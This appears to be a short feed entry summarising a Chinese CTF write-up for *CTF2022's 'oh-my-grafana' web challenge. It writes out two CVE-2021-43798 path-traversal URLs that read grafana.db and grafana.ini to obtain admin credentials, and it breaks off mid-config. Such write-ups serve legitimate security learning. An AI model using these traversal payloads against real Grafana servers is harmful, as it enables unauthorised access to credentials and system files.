item.title: [*CTF2022] WP
item.author: Huamang
item.description: Web oh-my-grafana 存在CVE-2021-43798 paylaod 1 http://124.70.163.46:3000/public/plugins/alertGroups/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar/lib/grafana/grafana.db 有个加盐的密码 再找找其他配置文件，反正任意文件读取用起来 1 http://124.70.163.46:3000/public/plugins/alertGroups/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/grafana/grafana.ini 拿到了密码 1 2 3 4 5 # default admin user, created on startup admin_user =
